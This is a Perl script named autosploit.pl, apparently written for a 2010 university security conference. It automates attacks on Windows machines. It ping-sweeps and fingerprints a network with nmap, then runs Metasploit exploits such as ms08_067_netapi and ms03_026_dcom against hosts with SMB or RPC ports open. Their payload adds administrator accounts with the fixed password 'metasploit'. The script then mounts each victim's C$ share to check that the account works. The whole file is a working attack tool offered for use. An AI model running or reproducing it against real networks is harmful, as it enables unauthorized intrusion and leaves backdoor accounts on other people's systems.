#! /usr/bin/perl

##### autosploit.pl written by JimmyC
##### Uses your path to run NMap and
##### Metasploit (msfcli) for automatic
##### exploitation of hosts
##### licensed under the GPL license

##### LICENSE
##### This program is free software: you can redistribute it and/or modify
##### it under the terms of the GNU General Public License as published by
##### the Free Software Foundation, either version 3 of the License, or
##### (at your option) any later version.
##### 
##### This program is distributed in the hope that it will be useful,
##### but WITHOUT ANY WARRANTY; without even the implied warranty of
##### MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##### GNU General Public License for more details.
##### 
##### You should have received a copy of the GNU General Public License
##### along with this program.  If not, see <http://www.gnu.org/licenses/>.

use warnings;
use strict;

# perl module for parsing command line
use Getopt::Std;

##### CONSTANTS
use constant VERSION => '0.2';
use constant TRUE => 1;
use constant FALSE => 0;


##### VARIABLES
# will hold the initial target gotten from the command line
my $initial_target;
# will hold the targets to ignore
my $exclusions;
# will hold machines that are up
my @host_array;
# hold host information from scan
# is really a hash of hashes of arrays where the keys are the IPs of the 
# machines that are OS scanned followed by the keys open_ports and os
my %host_hash;
# variable for iterating through host_array and host_hash
my $host;
# variable for iterating through command output
my $line;
# variable to hold the user that metasploit will try to create
my $new_user;
# options hash to hold all command line arguments
my %Options;
# if 0 don't run exploits.  if 1, run exploits.
my $exploit_flag = 0;

##### MAIN
&setup;
&ping_sweep;
&os_detect;
# will only run the exploits if the e flag is given when the script is run
if ($exploit_flag == 1)
{
	&exploit_host;
}
&print_output;

##### SUB ROUTINES

##### SETUP SUB ROUTINE
# will do initial setup and argument checking
sub setup
{
	# clears the list of exclusions that the script will not run against
	undef $exclusions;
	# path to ifconfig
	my $ifconfig="/sbin/ifconfig";
	# sets lines equal to what ifconfig gives out or kills the program and tells the user why
	my @lines=qx|$ifconfig| or die("Can't get info from ifconfig: ".$!);
	# iterates through the lines array so that can get all IP addresses assigned to the box
	# the script is run on
	foreach(@lines)
	{
		# if the line is inet addr and the ip is not 127.0.0.1, then this is true
		if(($_ =~ /inet addr:([\d\.]+)/i) && ($_ !~ /inet addr:127.0.0.1/i))
		{
			# if exclusions is undefined then this is the first exclusion
			if (!defined($exclusions))
			{
			    $exclusions = $1;
			}
			# exclusions are defined so add the new ip to the list
			# comma delimited
			elsif (defined($exclusions))
			{
			    $exclusions .= ",$1";
			}
		}
	}
	# uses the getopts function to get all options from the command line
	# and sets them into the Options hash
	# the letters hevxt are valid options that can be given to the script
	# with x and t needed arguments
	getopts('hevt:x:', \%Options);
	# if h is defined in the Options hash then go to the usage eubroutine
	if (defined($Options{'h'}))
	{
		&usage;
	}
	# if v is defined in the Options hash then go to the version subroutine
	if (defined($Options{'v'}))
	{
		&print_version;
	}
	# if e is defined in the Options hash then exploits will be run because
	# exploit_flag will be set to 1
	if (defined($Options{'e'}))
	{
		$exploit_flag = 1;
	}
	# if x is defined in the Options hash, the additional exclusions are
	# given and need to be added to the exclusions string
	if (defined($Options{'x'}))
	{
		# checks to make sure that the value of x in the Options hash matches an ip address,
		# or range of addresses
		if ($Options{'x'} =~ /([\d|\.|\,|\/]+)/i)
		{
			chomp($Options{'x'});
			# checks to make sure that exclusions is defined and if
			# not it sets it to x value otherwise appends to x value
			if (!defined($exclusions))
			{
				$exclusions = $Options{'x'};
			}
			elsif (defined($exclusions))
			{
				$exclusions .= ",$Options{'x'}";
			}
		}
		# if the value is not and ip address then error message is displayed
		# as well as usage
		else
		{
			print "\n\nTarget not IP address or IP subnet\n\n";
			&usage;
		} 
	}
	# checks to make sure that t is defined in Options hash
	if (defined($Options{'t'}))
	{
		# makes sure that t is an ip address or subnet
		if ($Options{'t'} =~ /([\d|\.|\,|\/]+)/i)
		{
			chomp($Options{'t'});
			# sets the initial target to the value of t
			$initial_target = $Options{'t'};
		}
		# not an IP address or subnet so tell the user the error and
		# then show the usage
		else
		{
			print "\n\nTarget not IP address or IP subnet\n\n";
			&usage;
		}
	}
	# t is not defined so tell the user that script needs a target and then
	# show usage
	else
	{
		print "\n\nNEED A TARGET\n\n";
		&usage;
	}
	# if there is anything left in the argument array then there was a problem
	# so tell the user that and then show the usage
	if ($ARGV[0])
	{
		print "\n\nUnknown option given\n\n";
		&usage;
	}
# end of setup function	
}

##### USAGE
# will print the usage for the user
# and then exit the script
sub usage
{
	print "\n\n";
	print "Usage:\n";
	# $0 is the name of the script that is run.  Fills in automatically.
	print "$0 [-h] [-v] [-e] [-x exclusions] <-t target>\n\n";
	print "[-h] -- optional\n";
	print "     -- prints this menu\n";
	print "[-v] -- optional\n";
	print "     -- prints the version of the script\n";
	print "[-e] -- optional\n";
	print "     -- tries to exploit targets\n";
	print "<-x exclusion> -- optional\n";
	print "     -- exclusions to exclude from scanning (NMap format)\n";
	print "<-t target> -- required\n";
	print "     -- initial target to start with (NMap format)\n";
	print "\n\n";
	exit;
# end of usage function
}

# SUB ROUTINE TO PRINT SCRIPT VERSION
### prints script version to STDOUT
sub print_version
{
	# $0 is the script name and prints the VERSION constant along with other
	# version info
	print "$0 is running version " . VERSION . ".\n";
	print "Originally written by JimmyC for the Murray State University 2010 Patterns of Distinction Security Matters conference.\n";
	print "Licensed under the GPL license.\n";
	exit;
# end of print_version function
}

##### PING SWEEP SUB ROUTINE
# performs a ping sweep on initial targets
sub ping_sweep
{	
	# lets the user know what is happening
	print "Performing Ping Sweep on $initial_target...\n";
	# opens a file handle to the command that ends in a pipe
	# this allows the output to be gotten and read for processing
	# runs an nmap scan with a ping sweep with speed of 3 using the exclusions
	# listed in the exclusions string against the initial target given from the command line
	open(PING_SWEEP, "nmap -sP -T3 --exclude $exclusions $initial_target |");
	# clears the host variable
	undef $host;
	# reads in the output of the ping sweep command
	while (<PING_SWEEP>)
	{
		# sets line to the current line from the ping sweep
		$line = $_;
		# if the line matches Starting Nmap, skip it and go to the next line
		if ($line =~ /Starting Nmap /i)
		{
			next;
		}
		# this line tells you who is being scanned.  Grab the ip and set it to $host
		elsif ($line =~ /Nmap scan report for ([\d|\.]+)/i)
		{
			$host = $1;
		}
		# checks to see if the Host is up and that $host is defined.  If they are, the push the ip of the 
		# host ont othe host_array and undefine $host to start the process over again
		elsif (($line =~ /Host is up \(\d+\.\d+s latency\)\./i) && (defined($host))) 
		{
			push(@host_array, $host);
			undef $host;
		}
	}
	# close the file handle for the ping sweep command
	close PING_SWEEP;
# end of the ping_sweep function
}

##### OS DETECTION USING PING SWEEP RESULTS SUB ROUTINE
# uses the hosts from the ping sweep to do OS detection on them
sub os_detect
{
	# iterates through each host of the host_array
	# values in this array are the results from the ping sweep (hosts that were up)
	foreach $host (@host_array)
	{
		# chomps the $host variable to remove all end of line junk
		chomp($host);
		# tells the user what is happening
		print "\nDetermining OS of $host...\n";
		# opens a file handle to get the output of the nmap command
		# use -A to get all scans and most common ports and OS detection
		# and runs it against the host from the host_array
		open(OS_DETECT, "nmap -A $host |");
		# reads in the output of the nmap command a line at a time using
		# a file handle
		while(<OS_DETECT>)
		{
			# sets $line to the current output line from the command
			$line = $_;
			# removes all end of line junk
			chomp($line);
			# if the line matches Starting Namp, skip it and move 
			# to the next line
			if ($line =~ /Starting Nmap /i)
			{
				next;
			}
			# if the line tells who is getting scanned, grab the ip 
			elsif ($line =~ /Nmap scan report for (.+)/i)
			{
				# makes sure that the IP of the one getting scanned matches who
				# the command was supposed to scan.  If they match, then go to the next line
				# else print error and exit.
				if ($1 eq $host)
				{
					next;
				}
				else 
				{
					print "There was a problem somewhere.\n\nEXITING!!\n\n";
					exit;
				}
			}
			# if the line just says that the host is up, skip it and move to the next line
			elsif ($line =~ /Host is up \(\d+\.\d+s latency\)\./i)
			{
				next;
			}
			# if the line tells you how many ports are closed, skip it and move to the next line
			####
			## MAY WANT TO HAVE THIS SHOW UP IN FINAL REPORT
			## WORK ON THIS IN NEXT VERSION
			####			
			elsif ($line =~ /Not shown\: \d+ closed ports/i)
			{
				next;
			}
			# if the line is just th legend, skip it and move to the next line
			elsif ($line =~ /PORT     STATE SERVICE    VERSION/i)
			{
				next;
			}
			# if the line tells you what was done and who to report incorrect results to, skip it
			# and move to the next line
			elsif ($line =~ /Service detection performed\. Please report any incorrect results at http\:\/\/nmap\.org\/submit\/ \./i)
			{
				next;
			}
			# if the line says that Nmap is done, skip it and move to the next line
			elsif ($line =~ /Nmap done\: \d+ IP address \(\d+ host up\) scanned in \d+\.\d+ seconds/i)
			{
				next;
			}
			# if the line says that all ports are closed on the host, grab the host
			elsif ($line =~ /All 1000 scanned ports on (.+) are closed/i)
			{
				# if the host matches the one just scanned, set line2 to tell 
				# the user what happened and push that line onto the host_hash for that ip.  Next undefine line2 
				# move to the next line.
				if ($1 eq $host)
				{
					# commented out this line because was causing an issue with the scan
					# when trying to do the push in a couple of lines
					#undef @{$host_hash{$host}};
					my $line2 = "$host is up but the ports used for OS detection are closed.  No other scans done.";
					push(@{$host_hash{$host}{'closed_ports'}}, $line2);
					undef $line2;
					next;
				}
				# host didn't match ip, so tell the user something bad happened and exit
				else 
				{
					print "There was a problem somewhere.\n\nEXITING!!\n\n";
					exit;
				}
			}
			# check to see if the port is active and if so, put it onto the array for the host_hash
			# for that port type
			elsif ($line =~ /(\d+)\/(\w+)\s+open\s+.+/i)
			{
				if ($2 eq 'tcp')
				{
					push(@{$host_hash{$host}{'open_ports'}{'tcp'}}, $1);
				}
				elsif ($2 eq 'udp')
				{
					push(@{$host_hash{$host}{'open_ports'}{'udp'}}, $1);
				}
			}
			# check to see what os and push that onto the array for the host hash
			elsif ($line =~ /OS details\: (.+)/i)
			{
				push(@{$host_hash{$host}{'os'}}, $1);
			}
		}
		# closes the file handle for the Nmap command
		close OS_DETECT;
	}
# end of the os_detect function
} 

##### EXPLOIT_HOST SUB ROUTINE
# will exploit the host based on the
# information from the os_detect and ping sweep functions
sub exploit_host
{
	# iterates through the keys of the host_hash which is the ip
	# addresses of machines that are up
	for my $key (keys %host_hash)
	{
		# tells the user what is going to happen
		print "\nGoing to see what can be exploited on host $key...\n";
		# iterates through all of the open tcp ports on the host
		foreach my $port (@{$host_hash{$key}{'open_ports'}{'tcp'}})
		{
			# gets it just down to the port number and removes new line crap
			chomp($port);
			# if the port is equal to 445, then move in and see if exploits work
			if ($port == 445)
			{
				# calls default_exploit and passes it the ip of the machine and
				# the exploit to run
				# does this for each exploit want to run
				&default_exploit($key, "windows/smb/ms04_011_lsass");
				&default_exploit($key, "windows/smb/ms08_067_netapi");
				&default_exploit($key, "windows/smb/ms06_066_nwapi");
				&default_exploit($key, "windows/smb/ms05_039_pnp");
				&default_exploit($key, "windows/smb/ms06_066_nwwks");
			}
			# if the port is equal to 135, then move in and see if exploits work
			elsif ($port == 135)
			{
				# calls default_exploit and passes it the ip of the machine and
				# the exploit to run
				# does this for each exploit want to run
				&default_exploit($key, "windows/dcerpc/ms03_026_dcom");
			}
		}
	}			
# end of exploit_host function 
}

# SUB ROUTINE TO RUN EXPLOITS
### will run exploits with default settings
# it is passed the ip of the host to exploit
# and the exploit to try
sub default_exploit
{
	# sets ip to the first argument passed
	my $ip = $_[0];
	# sets $exploit to the second argument passed
	my $exploit = $_[1];
	# creates a temp array for storing exploit output
	my @temp_array;
	# creates a temporary string variable
	my $string;
	# undefines the string variable to clear it
	undef $string;
	# undefines the temp_array to clear it
	undef @temp_array;
	# creates a hash that will hold the options for the exploits wanting to run
	my %options_hash;
	# sets option_string to get the options for the exploit wanting to run
	# uses the ip as the RHOST value so that that is one value that will already be
	# filled in
	# also redirected stderr to stdin so could get it in the pipe
	my $options_string = "msfcli $exploit RHOST=$ip O 2>&1 |";
	# open the options_string as a file so can read stdin
	open(OPTIONS, $options_string);
	# read in OPTIONS filehandle one line at a time
	while (<OPTIONS>)
	{
		# sets line to current read in line
		$line = $_;
		# remove all end of line garbage
		chomp($line);
		# pushes the read in line onto the temp_array array
		push(@temp_array, $line);
	}
	# closes the file handle OPTIONS
	close (OPTIONS);
	# remove the last line of the temp_array array because just garbage
	pop(@temp_array);
	# remove first four lines of the temp_array because they are just garbage
	shift(@temp_array);
	shift(@temp_array);
	shift(@temp_array);
	shift(@temp_array);
	# iterate through the temp_array array setting line to the current line
	foreach $line (@temp_array)
	{
		# if line is not defined go to the next line
		if (!defined($line))
		{
			next;
		}
		# if line is the RHOST option with an ip address then go to the next line
		elsif ($line =~ /\s+RHOST\s+([A-Za-z0-9\.]+)\s+yes\s+[A-Za-z0-9\s]+$/i)
		{
			next;
		}
		# if line is the RPORT option with a port defined then go to the next line
		elsif ($line =~ /\s+RPORT\s+([A-Za-z0-9\.]+)\s+yes\s+[A-Za-z0-9\s]+$/i)
		{
			next;
		}
		# if the line is any other option with the default option filled in, push then option
		# onto the array called @{options_hash{required}{option}}
		# also the option is set to all caps
		elsif ($line =~ /\s+([A-Za-z0-9\.]+)\s+([A-Za-z0-9\.]+)\s+yes\s+[A-Za-z0-9\s]+$/i)
		{
			push(@{$options_hash{'required'}{$1}}, uc($2));
		}
		# if the line is any option with a default option filled in but still has
		# other values listed in the description, then this is true
		elsif ($line =~ /\s+([A-Za-z0-9\.]+)\s+([A-Za-z0-9\.]+)\s+yes\s+[A-Za-z0-9\s]+\((.+)\)/i)
		{
			# push the inital default value onto the array of @{options_hash{required}{option}}
			push(@{$options_hash{'required'}{$1}}, uc($2));
			# split the other options listed on a comma and a space and set them into
			# the options array
			my @options = split(/, /, $3);
			# iterate through each of the split options
			foreach (@options)
			{
				# sets option to the all caps version of the current possible value
				my $option = uc($_);
				# if the current value does not equal the all caps version of the
				# value gotten in the options line push it onto the
				# @{options_hash{required}{option}} array
				if ($option ne uc($2))
				{
					push(@{$options_hash{'required'}{$1}}, $option);
				}
			}
		}
		# if the option is optional and has a default value push it onto the
		# @{options_hash{optional}{option}} array
		elsif ($line =~ /\s+([A-Za-z0-9\.]+)\s+([A-Za-z0-9\.]+)\s+no\s+.[A-Za-z0-9\s]+/i)
		{
			push(@{$options_hash{'optional'}{$1}}, uc($2));
		}
		# if the option is optional and has a default value and lists other possible
		# values in the description, then move in
		elsif ($line =~ /\s+([A-Za-z0-9\.]+)\s+([A-Za-z0-9\.]+)\s+no\s+[A-Za-z0-9\s]+\((.+)\)/i)
		{
			# push the default value onto the @{options_hash{optional}{option}} array
			push(@{$options_hash{'optional'}{$1}}, uc($2));
			# sets options array to the values split from the description
			# split based on a comma and a space
			my @options = split(/, /, $3);
			# iterates through the options array
			foreach (@options)
			{
				# sets option to the all caps version of the current possible value
				my $option = uc($_);
				# if the current value does not equal the all caps version of the
				# value gotten in the options line push it onto the
				# @{options_hash{optional}{option}} array
				if ($option ne uc($2))
				{
					push(@{$options_hash{'optional'}{$1}}, $option);
				}
			}
		}
 	}
	# creates variable for holding exploit strings
	my @exploit_strings;
	# clears out anything in exploit string that was there
	undef @exploit_strings;
	# checks to see if required or optional are defined exist in the options_hash has
	if ((exists $options_hash{'required'}) || (exists $options_hash{'optional'}))
	{
		# iterates through the options_hash hash with keys of explicit
		for my $explicit (keys %options_hash)
		{
			# iterates through the hash %{$options_hash{$explicit}} with keys set to type
			for my $type (keys %{$options_hash{$explicit}})
			{
				# sets local variable counter1 to 0
				my $counter1 = 0;
				# iterates through the array @{$options_hash{$explicit}{$type}}
				# setting values to option
				foreach my $option (@{$options_hash{$explicit}{$type}})
				{
					# creates a new user account by calling sub rountine generate_new_username
					$new_user = generate_new_username();
					# creates an exploit string ysing the option of type=option and sets the payload to add
					# a user account with the name as new_user variable plus the counter1 variable
					my $exploit_string_push = "msfcli $exploit RHOST=$ip $type=$option PAYLOAD=windows/adduser USER=$new_user$counter1 E 2>&1 |";
					# pushes the exploit string onto the exploit_strings array
					push(@exploit_strings, $exploit_string_push);
					# increases the counter1 variable by one
					$counter1++;
				}
			}
		}
	}
	# no options other than port and address so just create the exploit string
	else
	{
		# generate a new username and set it to the new_user variable
		$new_user = generate_new_username();
		# set exploit_strings position 0 to the exploit string that has a
		# payload of adding a new user to the system
		$exploit_strings[0] = "msfcli $exploit RHOST=$ip PAYLOAD=windows/adduser USER=$new_user E 2>&1 |";
	}
	# iterates through the exploit_strings array
	foreach (@exploit_strings)
	{
		# remove any end of line garbage
		chomp($_);
		# creates temp variable exploit_string and sets it to the current line
		my $exploit_string = $_;
		# undefine the new_user variable so can set it later
		undef $new_user;
		# does matching to get username trying to make and exploit using
		# no extra options given on this one
		if ($exploit_string =~ /msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ PAYLOAD\=windows\/adduser USER\=(user\d+) E 2\>\&1 \|/i)
		{
			# new_user it set to the user account in the exploit string
			$new_user=$2;
			# tells the user what exploit is going to be tried and what user account will be created
			print "Going to try to use exploit $1 and create user $new_user\n";
		}
		# gets the exploit, options, and the user account that will be tried
		elsif ($exploit_string =~ /msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ (.+) PAYLOAD\=windows\/adduser USER\=(user\d+) E 2\>\&1 \|/i)
		{
			# sets new_user to the user account in the exploit string
			$new_user=$3;
			# tells the user what exploit will be tried with what options, and what user account will be created
			print "Going to try to use exploit $1 with option(s) $2 and create user $new_user\n";
		}
		# createa a counter and sets it to 1
		my $counter = 1;
		# clears the temp_array array
		undef(@temp_array);
		# while counter is less than 4, this will continue
		# this will allow the exploits to be tried 3 times apiece
		# do this because sometimes the exploit might fail the first couple of times
		while ($counter < 4)
		{
			# opens a file handle using the exploit_string
			open(EXPLOIT, $exploit_string);
			# reads in the lines from the command output
			while (<EXPLOIT>)
			{
				# sets line to the current read in line
				$line = $_;
				# removes end of line crap for line
				chomp($line);
				# pushes the line onto the temp_array array
				push(@temp_array, $line);
			}
			# closes the file handle for the exploit command
			close(EXPLOIT);
			# removes the last line of the temp_array array
			pop(@temp_array);
			# checks to see if the exploit worked using exploit_worked subroutine
			# if it worked then this is true
			# passes the last line of the temp_array array, the ip, and the
			# user account tried to create
			if (&exploit_worked(pop(@temp_array), $ip, $new_user))
			{
				# if the exploit does no include any extra options, then
				# set counter to 10, set string to what user was added with what exploit,
				# push that string onto the array @{$host_hash{$ip}{'exploits_that_worked'}}
				if ($exploit_string =~ /msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ PAYLOAD\=windows\/adduser USER\=(user\d+) E 2\>\&1 \|/i)
				{
					$counter = 10;
					$string = "$2 added with password metasploit using $1 exploit";
					push(@{$host_hash{$ip}{'exploits_that_worked'}}, $string);
				}
				# if the exploit includes extra options, then
				# set counter to 10, set string to what user was added with what exploit and options
				# push the string onto the array @{$host_hash{$ip}{'exploits_that_worked'}}
				elsif ($exploit_string =~ /msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ (.+) PAYLOAD\=windows\/adduser USER\=(user\d+) E 2\>\&1 \|/i)
				{
					$counter = 10;
					$string = "$3 added with password metasploit using $1 exploit and option(s) $2";
					push(@{$host_hash{$ip}{'exploits_that_worked'}}, $string);
				}
			}
			# exploit didn't work, so counter is incremented by one
			else
			{
				$counter += 1;
			}
		}
		# checks to see if string is defined or not.  if not, then this is true
		# and that means that the exploit was unsuccessful
		if (!defined($string))
		{
			# checks to see if the exploit string does not contain any extra options
			if ($exploit_string =~ /msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ PAYLOAD\=windows\/adduser USER\=(user\d+) E 2\>\&1 \|/i)
			{
				# sets string to exploit failed string
				$string = "$1 failed to exploit";
				# pushes the string onto the array @{$host_hash{$ip}{'exploits_that_failed'}}
				push(@{$host_hash{$ip}{'exploits_that_failed'}}, $string);
				# clears the string in case don't later on
				undef $string;
			}
			# checks to see if the exploit string contains any extra options
			elsif ($exploit_string =~ /msfcli ([\w|\/]+) RHOST\=[\w|\d|\.]+ (.+) PAYLOAD\=windows\/adduser USER\=(user\d+) E 2\>\&1 \|/i)
			{
				# sets string to exploit failed with options string
				$string = "$1 failed to exploit using option(s) $2";
				# pushes the string onto the array @{$host_hash{$ip}{'exploits_that_failed'}}
				push(@{$host_hash{$ip}{'exploits_that_failed'}}, $string);
				# clears the string in case don't later on
				undef $string;
			}
			
		}
		# undefines the string variable to make sure that it is clear.
		undef $string;
	# moves to the next exploit string
	}
	
# end of default_exploit function
}

### SUB ROUTINE TO GENERATE NEW USERNAME
# will make new username to pass to metasploit
sub generate_new_username
{
	# takes the time on the local machine and passes it to the localtime function that then
	# sets each of the temp variables to the the correct position
	(my $Second, my $Minute, my $Hour, my $Day, my $Month, my $Year, my $WeekDay, my $DayOfYear, my $IsDST) = localtime(time);
	# sets the Year to 1900 plus itself
	$Year += 1900;
	# adds one to Month because month is typically 0-11
	$Month++;
	# sets date to the concatenation of Hour, Minute, Second, Month, Day, and Year
	my $date = $Hour . $Minute . $Second . $Month . $Day . $Year;
	# returns user concatenated with the date variable
	return "user" . $date;
# end of generate_new_username function
}

# SUB ROUTINE TO SEE IF EXPLOIT WORKED
### Takes the last line of the temp_array variable, the ip of the 
### host, and the user account created and checks to see if the exploit worked
sub exploit_worked
{
	# last line of the temp array that is passed to the function
	$line = $_[0];
	# temp variable holding the ip address passed to the function
	my $ip = $_[1];
	# temp variable of the user account created, passed to the function
	my $user = $_[2];
	# checks to see if the last line gotten from the exploit is not Exploit Failed
	# if it is not, then the check proceeds
	if ($line !~ /Exploit failed\: /i)
	{
		# sets the temporary variable to what the mount command will be to test if the exploit worked
		# should only be able to mount the C drive if the user is an admin
		# also pass all output (error and other) to STDOUT
		my $mount_command = "mount -t cifs //$ip/C\$ /mnt/smb/ -o username=$user,password=metasploit 2>&1";
		# sets result to the commnd output of running the command
		my $result = `$mount_command`;
		# if result matches the mount error, then the user was not created and False is returned
		# to the calling operation
		if ($result =~ /mount error 13 \= Permission denied/i)
		{
			return FALSE;
		}
		# must be mounted so unmount the share
		`umount /mnt/smb`;
		# since it made it this far, that means that the command worked and True is returned to the 
		# calling operation
		return TRUE;
	}
	# the last line gotten from the exploit was Exploit Failed so, return 
	# False to the calling function
	else
	{
		return FALSE;
	}
# end of exploit_worked function
}

##### PRINT OUTPUT SUB ROUTINE
# will print output of the results of this scan
sub print_output
{
	# tell the user what is about to happen
	print "\n\nOUTPUT:\n\n";
	# iterates through all the hosts in the host_hash hash
	for my $key (keys %host_hash)
	{
		# tell the user what target the information is for
		print "TARGET = $key\n";
		# sees if the value for @{$host_hash{$key}{'closed_ports'}}[0] is defined
		if (defined(@{$host_hash{$key}{'closed_ports'}}[0]))
		{
			# sets string equal to @{$host_hash{$key}{'closed_ports'}}[0]
			my $string = @{$host_hash{$key}{'closed_ports'}}[0];
			# prints the string for the user
			print "\t$string\n";
		}
		# the host was up so time to print out information about it
		else
		{
			# checks to see if we got the os of the host
			if (defined(@{$host_hash{$key}{'os'}}))
			{
				# tell the user what they are about to see
				print "\tOS:\n";
				# iterates through the os listing and chomps each line
				# and then prints each line to the screen
				foreach (@{$host_hash{$key}{'os'}})
				{
					chomp($_);
					print "\t\t$_\n";
				}
			}
			# checks to see if there are any tcp ports open on the host
			if (defined(@{$host_hash{$key}{'open_ports'}{'tcp'}}))
			{
				# tells the user what they are about to see
				print "\tTCP Ports Open:\n";
				# iterates through the tcp ports and if the line is
				# defined, chomps it, and prints it to the screen
				foreach (@{$host_hash{$key}{'open_ports'}{'tcp'}})
				{
					if (defined($_))
					{
						chomp($_);
						print "\t\t$_\n";
					}
				}
			}
			# checks to see if there are any udp ports open on the host
			if (defined(@{$host_hash{$key}{'open_ports'}{'udp'}}))
			{
				# tells the user what they are about to see
				print "\tUDP Ports Open:\n";
				# iterates through the udp ports and if the line is
				# defined, chomps it, and prints it to the screen
				foreach (@{$host_hash{$key}{'open_ports'}{'udp'}})
				{
					chomp($_);
					print "\t\t$_\n";
				}
			}
			# checks to see exploits were run and if so then move in
			if ($exploit_flag == 1)
			{
				# checks to see if exploits worked on the host
				if (defined(@{$host_hash{$key}{'exploits_that_worked'}}))
				{
					# tells the user what they are about to see
					print "\tExploits that Worked:\n";
					# iterates through the worked exploits and chomps each line and \
					# then prints the line to the screen
					foreach (@{$host_hash{$key}{'exploits_that_worked'}})
					{
						chomp($_);
						print "\t\t$_\n";
					}
				}
				# checks to see if exploits failed on the host
				if (defined(@{$host_hash{$key}{'exploits_that_failed'}}))
				{
					# tells the user what they are about to see
					print "\tExploits that Failed:\n";
					# iterates through the failed exploits and chomps each line
					# and prints the line to the screen
					foreach (@{$host_hash{$key}{'exploits_that_failed'}})
					{
						chomp($_);
						print "\t\t$_\n";
					}
				}
			}
		}
		# prints a few new lines for spacing
		print "\n\n";
	# moves to the next host in the hash
	}
}